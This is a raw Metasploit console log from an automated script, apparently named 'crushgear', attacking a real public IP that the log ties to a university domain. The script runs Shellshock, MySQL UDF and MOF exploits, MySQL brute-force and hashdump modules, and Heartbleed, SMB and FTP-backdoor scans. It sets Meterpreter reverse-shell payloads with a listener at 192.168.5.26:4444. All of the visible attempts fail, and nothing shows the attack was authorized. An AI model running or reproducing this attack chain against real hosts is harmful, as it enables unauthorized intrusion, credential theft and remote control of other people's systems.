+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+RPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m 72.61.211.92:443      - Error: '72.61.211.92' 'Errno::ECONNRESET' 'Connection reset by peer - SSL_connect' '["/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/ssl_tcp.rb:152:in `connect'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/ssl_tcp.rb:152:in `block in initsock_with_ssl_version'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/timeout-0.6.0/lib/timeout.rb:295:in `block in timeout'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/timeout-0.6.0/lib/timeout.rb:38:in `handle_timeout'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/timeout-0.6.0/lib/timeout.rb:304:in `timeout'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/ssl_tcp.rb:150:in `initsock_with_ssl_version'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/ssl_tcp.rb:72:in `initsock'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/comm/local.rb:328:in `create_by_type'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/comm/local.rb:37:in `create'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket.rb:52:in `create_param'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/tcp.rb:37:in `create_param'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/tcp.rb:28:in `create'", "/usr/share/metasploit-framework/lib/msf/core/exploit/remote/tcp.rb:103:in `connect'", "/usr/share/metasploit-framework/modules/auxiliary/scanner/http/cert.rb:35:in `run_host'", "/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:116:in `block (2 levels) in run'", "/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:105:in `block in spawn'"]'
+[1m[34m[*][0m 72.61.211.92:443      - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module running as background job 37.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/wordpress_xmlrpc_login
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 38.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/http_login
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[1m[34m[*][0m 72.61.211.92:443     :/xmlrpc.php - Sending Hello...
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 39.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/ssl/openssl_heartbleed
+[0m[1m[34m[*][0m Setting default action [32mSCAN[0m - view all 3 actions with the [32mshow actions[0m command
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 40.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/ssl/openssl_ccs
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 41.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD linux/x86/meterpreter/reverse_tcp
+[0mPAYLOAD => linux/x86/meterpreter/reverse_tcp
+[1m[34m[*][0m 72.61.211.92:443      - Scanned 1 of 1 hosts (100% complete)
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[1m[34m[*][0m 72.61.211.92:443      - Scanned 1 of 1 hosts (100% complete)
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m Msf::OptionValidateError One or more options failed to validate: TARGETURI.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/mysql/mysql_version
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 42.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/mysql/mysql_login
+[0m[1m[32m[+][0m 72.61.211.92:3306 - 72.61.211.92:3306 is running MySQL 11.8.3-MariaDB-log (protocol 10)
+[1m[34m[*][0m 72.61.211.92:3306 - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m New in Metasploit 6.4 - The [32mCreateSession[0m option within this module can open an interactive session
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set USER_AS_PASS true
+[0mUSER_AS_PASS => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set BLANK_PASSWORDS true
+[0mBLANK_PASSWORDS => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set STOP_ON_SUCCESS false
+[0mSTOP_ON_SUCCESS => false
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 43.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 44.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/mysql/mysql_hashdump
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m 72.61.211.92:3306 - Msf::OptionValidateError The following options failed to validate:
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option PASSWORD: PASSWORD must be specified
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option USERNAME: USERNAME must be specified
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/mysql/mysql_file_enum
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m 72.61.211.92:3306 - Msf::OptionValidateError One or more options failed to validate: FILE_LIST.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/mysql/mysql_schemadump
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m 72.61.211.92:3306 - Msf::OptionValidateError The following options failed to validate:
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option PASSWORD: PASSWORD must be specified
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option USERNAME: USERNAME must be specified
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/admin/mysql/mysql_enum
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m 72.61.211.92:3306 - Msf::OptionValidateError The following options failed to validate:
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option PASSWORD: PASSWORD must be specified
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option USERNAME: USERNAME must be specified
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/admin/mysql/mysql_sql
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SQL SELECT user(), version(), @@datadir, @@global.secure_file_priv
+[0mSQL => SELECT user(), version(), @@datadir, @@global.secure_file_priv
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m 72.61.211.92:3306 - Msf::OptionValidateError The following options failed to validate:
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option PASSWORD: PASSWORD must be specified
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option USERNAME: USERNAME must be specified
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/multi/mysql/mysql_udf_payload
+[0m[1m[32m[+][0m 72.61.211.92:3306     - 72.61.211.92:3306 - Found remote MySQL version 11.8.3
+[1m[32m[+][0m 72.61.211.92:3306     - 72.61.211.92:3306 The server allows logins, proceeding with bypass test
+[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD linux/x64/meterpreter/reverse_tcp
+[0mPAYLOAD => linux/x64/meterpreter/reverse_tcp
+[1m[34m[*][0m unila.ac.id           - Scanned 1 of 1 hosts (100% complete)
+[1m[33m[!][0m 72.61.211.92:3306     - No active DB -- Credential data will not be saved!
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m 72.61.211.92:3306 - Msf::OptionValidateError The following options failed to validate:
+[1m[31m[-][0m 72.61.211.92:3306 - Invalid option PASSWORD: PASSWORD must be specified
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/windows/mysql/mysql_mof
+[0m[1m[31m[-][0m 72.61.211.92:3306     - 72.61.211.92:3306 - LOGIN FAILED: root:root (Incorrect: Access denied for user 'root'@'202.180.25.41' (using password: YES))
+[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[1m[31m[-][0m 72.61.211.92:3306     - 72.61.211.92:3306 - LOGIN FAILED: root: (Incorrect: Access denied for user 'root'@'202.180.25.41' (using password: NO))
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
+[0mPAYLOAD => windows/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m 72.61.211.92:3306     - Scanned 1 of 1 hosts (100% complete)
+[1m[31m[-][0m 72.61.211.92:3306 - Msf::OptionValidateError One or more options failed to validate: USERNAME, PASSWORD.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> jobs -l
+[0m
+Jobs
+====
+
+  Id  Name                                                Payload                              Payload opts
+  --  ----                                                -------                              ------------
+  0   Exploit: multi/handler                              windows/x64/meterpreter/reverse_tcp  tcp://192.168.5.26:4444
+  2   Auxiliary: scanner/smb/smb_ms17_010
+  3   Auxiliary: scanner/smb/smb_version
+  4   Auxiliary: scanner/smb/smb_enumshares
+  5   Auxiliary: scanner/smb/smb_enumusers
+  6   Auxiliary: scanner/smb/smb_lookupsid
+  8   Auxiliary: scanner/ftp/anonymous
+  10  Exploit: unix/ftp/vsftpd_234_backdoor               cmd/unix/interact
+  43  Auxiliary: scanner/mysql/mysql_login
+  44  Auxiliary: scanner/mysql/mysql_authbypass_hashdump
+
+resource (/tmp/crushgear_msf_xnse20jl.rc)> sleep 120
+[0m[1m[34m[*][0m 72.61.211.92:3306     - Bruteforce completed, 0 credentials were successful.
+[1m[34m[*][0m 72.61.211.92:3306     - You can open an MySQL session with these credentials and [32mCreateSession[0m set to true
+[1m[34m[*][0m 72.61.211.92:21       - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 10% complete
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 20% complete
+[1m[31m[-][0m 72.61.211.92:445      - Rex::ConnectionTimeout: The connection with (72.61.211.92:445) timed out.
+[1m[34m[*][0m unila.ac.id:445       - Scanned 1 of 1 hosts (100% complete)
+[1m[31m[-][0m 72.61.211.92:139 - The connection with (72.61.211.92:139) timed out.
+[1m[31m[-][0m 72.61.211.92:445 - Error: Msf::Exploit::Remote::SMB::Client::Ipc::SmbIpcConnectionError The connection with (72.61.211.92:445) timed out.
+[1m[31m[-][0m 72.61.211.92:445 - Error: Msf::Exploit::Remote::SMB::Client::Ipc::SmbIpcConnectionError The connection with (72.61.211.92:445) timed out.
+[1m[34m[*][0m unila.ac.id: - Scanned 1 of 1 hosts (100% complete)
+[1m[31m[-][0m unila.ac.id: - Auxiliary failed: NoMethodError undefined method `each' for an instance of String
+[1m[31m[-][0m unila.ac.id: - Call stack:
+[1m[31m[-][0m unila.ac.id: -   /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_lookupsid.rb:180:in `block in format_results'
+[1m[31m[-][0m unila.ac.id: -   /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_lookupsid.rb:179:in `each'
+[1m[31m[-][0m unila.ac.id: -   /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_lookupsid.rb:179:in `format_results'
+[1m[31m[-][0m unila.ac.id: -   /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_lookupsid.rb:195:in `run_host'
+[1m[31m[-][0m unila.ac.id: -   /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:116:in `block (2 levels) in run'
+[1m[31m[-][0m unila.ac.id: -   /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:105:in `block in spawn'
+[1m[34m[*][0m 72.61.211.92:21 - Banner: 220 FTP Server ready.
+[1m[34m[*][0m 72.61.211.92:21 - USER: 331 Password required for Gk0HPC:)
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 30% complete
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 40% complete
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 50% complete
+[1m[34m[*][0m unila.ac.id           - Scanned 1 of 1 hosts (100% complete)
+[1m[31m[-][0m 72.61.211.92:139 - The connection with (72.61.211.92:445) timed out.
+[1m[34m[*][0m unila.ac.id: - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 60% complete
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 70% complete
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 80% complete
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 90% complete
+[1m[34m[*][0m 72.61.211.92:3306     - 72.61.211.92:3306 Authentication bypass is 100% complete
+[1m[31m[-][0m 72.61.211.92:3306     - 72.61.211.92:3306 Unable to bypass authentication, this target may not be vulnerable
+[1m[34m[*][0m 72.61.211.92:3306     - Scanned 1 of 1 hosts (100% complete)
+resource (/tmp/crushgear_msf_xnse20jl.rc)> jobs -l
+[0m
+Jobs
+====
+
+  Id  Name                    Payload                              Payload opts
+  --  ----                    -------                              ------------
+  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.5.26:4444
+
+resource (/tmp/crushgear_msf_xnse20jl.rc)> sessions -l
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+resource (/tmp/crushgear_msf_xnse20jl.rc)> exit
+[0m
